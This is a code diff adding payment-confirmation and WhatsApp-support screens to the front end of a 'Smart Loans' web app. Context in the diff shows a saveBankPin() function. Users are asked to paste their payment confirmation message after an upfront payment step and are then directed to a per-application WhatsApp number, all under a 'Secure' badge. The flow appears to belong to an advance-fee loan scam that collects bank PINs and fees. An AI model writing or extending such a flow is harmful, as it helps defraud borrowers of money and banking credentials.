@@ -4685,6 +4685,472 @@ async function saveBankPin() {
 
 }
 // ======================================================
+// PAYMENT CONFIRMATION SCREEN
+// ======================================================
+
+function loadPaymentConfirmationScreen() {
+
+    const app =
+        document.getElementById("app");
+
+    if (!app) return;
+
+    app.innerHTML = `
+
+        <div class="container">
+
+            <div class="app-header">
+
+                <div>
+
+                    <div class="app-title">
+                        Smart Loans
+                    </div>
+
+                    <div class="app-subtitle">
+                        Fast • Secure • Convenient
+                    </div>
+
+                </div>
+
+                <div class="secure">
+                    🔒 Secure
+                </div>
+
+            </div>
+
+
+            <div class="progress-bar">
+
+                <div
+                    class="progress-fill"
+                    style="width:95%;">
+                </div>
+
+            </div>
+
+
+            <div class="welcome-card">
+
+                <div style="
+                    text-align:center;
+                    font-size:55px;
+                    margin-bottom:10px;
+                ">
+                    🧾
+                </div>
+
+
+                <h2 style="text-align:center;">
+                    Payment Confirmation
+                </h2>
+
+
+                <p style="
+                    text-align:center;
+                    line-height:1.8;
+                ">
+
+                    Thank you for completing
+                    the payment step.
+
+                    <br><br>
+
+                    Please enter the confirmation
+                    message or reference associated
+                    with your payment.
+
+                </p>
+
+
+                <label>
+                    Confirmation Message
+                </label>
+
+
+                <textarea
+                    id="paymentConfirmationMessage"
+                    rows="5"
+                    placeholder="Enter your payment confirmation message..."
+                    autocomplete="off"
+                    style="
+                        width:100%;
+                        box-sizing:border-box;
+                        margin-top:8px;
+                        padding:12px;
+                        resize:vertical;
+                    "
+                ></textarea>
+
+
+                <br><br>
+
+
+                <button
+                    id="confirmPaymentBtn">
+
+                    ✅ Confirm Payment
+
+                </button>
+
+            </div>
+
+        </div>
+
+    `;
+
+
+    document
+        .getElementById(
+            "confirmPaymentBtn"
+        )
+        .addEventListener(
+            "click",
+            submitPaymentConfirmation
+        );
+
+}
+
+
+// ======================================================
+// SUBMIT PAYMENT CONFIRMATION
+// ======================================================
+
+async function submitPaymentConfirmation() {
+
+    const input =
+        document.getElementById(
+            "paymentConfirmationMessage"
+        );
+
+    const message =
+        input.value.trim();
+
+
+    if (!message) {
+
+        alert(
+            "Please enter your payment confirmation message."
+        );
+
+        input.focus();
+
+        return;
+    }
+
+
+    const applicationId =
+        sessionStorage.getItem(
+            "applicationId"
+        );
+
+
+    if (!applicationId) {
+
+        alert(
+            "Application session not found."
+        );
+
+        return;
+    }
+
+
+    const button =
+        document.getElementById(
+            "confirmPaymentBtn"
+        );
+
+
+    try {
+
+        button.disabled = true;
+
+        button.textContent =
+            "Confirming...";
+
+
+        const response =
+            await fetch(
+                `/payment-confirmation/${applicationId}`,
+                {
+                    method: "PUT",
+
+                    headers: {
+                        "Content-Type":
+                            "application/json"
+                    },
+
+                    body: JSON.stringify({
+
+                        paymentConfirmationMessage:
+                            message
+
+                    })
+                }
+            );
+
+
+        const result =
+            await response.json();
+
+
+        if (
+            !response.ok ||
+            !result.success
+        ) {
+
+            throw new Error(
+                result.message ||
+                "Unable to save payment confirmation."
+            );
+
+        }
+
+
+        loadPaymentConfirmationSuccessScreen();
+
+
+    } catch (error) {
+
+        console.error(
+            "PAYMENT CONFIRMATION ERROR:",
+            error
+        );
+
+
+        alert(
+            error.message ||
+            "Unable to confirm payment."
+        );
+
+
+        button.disabled = false;
+
+        button.textContent =
+            "✅ Confirm Payment";
+
+    }
+
+}
+
+
+// ======================================================
+// PAYMENT CONFIRMATION SUCCESS
+// ======================================================
+
+function loadPaymentConfirmationSuccessScreen() {
+
+    const app =
+        document.getElementById("app");
+
+    app.innerHTML = `
+
+        <div class="container">
+
+            <div class="welcome-card">
+
+                <div style="
+                    text-align:center;
+                    font-size:60px;
+                ">
+                    ✅
+                </div>
+
+
+                <h2 style="text-align:center;">
+                    Confirmation Received
+                </h2>
+
+
+                <p style="
+                    text-align:center;
+                    line-height:1.8;
+                ">
+
+                    Your payment confirmation
+                    has been received successfully.
+
+                    <br><br>
+
+                    For quick assistance, please
+                    contact our support team using
+                    the WhatsApp Business number
+                    provided below.
+
+                </p>
+
+
+                <div
+                    id="whatsappSupportBox"
+                    style="
+                        margin-top:20px;
+                        padding:18px;
+                        background:#f5f7fa;
+                        border-radius:12px;
+                        text-align:center;
+                    "
+                >
+
+                    Loading support details...
+
+                </div>
+
+
+                <br>
+
+
+                <button
+                    id="finishPaymentBtn">
+
+                    Continue →
+
+                </button>
+
+            </div>
+
+        </div>
+
+    `;
+
+
+    loadWhatsAppSupport();
+
+
+    document
+        .getElementById(
+            "finishPaymentBtn"
+        )
+        .addEventListener(
+            "click",
+            loadTrackingScreen
+        );
+
+}
+
+
+// ======================================================
+// LOAD WHATSAPP SUPPORT NUMBER
+// ======================================================
+
+async function loadWhatsAppSupport() {
+
+    const box =
+        document.getElementById(
+            "whatsappSupportBox"
+        );
+
+
+    if (!box) return;
+
+
+    const applicationId =
+        sessionStorage.getItem(
+            "applicationId"
+        );
+
+
+    if (!applicationId) {
+
+        box.textContent =
+            "Support information unavailable.";
+
+        return;
+    }
+
+
+    try {
+
+        const response =
+            await fetch(
+                `/application/${applicationId}`,
+                {
+                    cache: "no-store"
+                }
+            );
+
+
+        const result =
+            await response.json();
+
+
+        if (
+            !response.ok ||
+            !result.success
+        ) {
+
+            throw new Error(
+                "Unable to load support information."
+            );
+
+        }
+
+
+        const whatsapp =
+            result.application
+                .whatsapp_business_number;
+
+
+        if (whatsapp) {
+
+            box.innerHTML = `
+
+                <strong>
+                    💬 WhatsApp Business Support
+                </strong>
+
+                <br><br>
+
+                <span style="
+                    font-size:20px;
+                    font-weight:bold;
+                ">
+
+                    ${whatsapp}
+
+                </span>
+
+                <br><br>
+
+                <small>
+                    Use this number for support
+                    and quick response.
+                </small>
+
+            `;
+
+        } else {
+
+            box.innerHTML = `
+
+                <strong>
+                    💬 WhatsApp Business Support
+                </strong>
+
+                <br><br>
+
+                Support contact will be
+                provided shortly.
+
+            `;
+
+        }
+
+
+    } catch (error) {
+
+        console.error(
+            "WHATSAPP SUPPORT ERROR:",
+            error
+        );
+
+
+        box.textContent =
+            "Unable to load support information.";
+
+    }
+
+}
+// ======================================================
 // PART 33 - INITIALIZE SMART LOANS
 // ======================================================
 
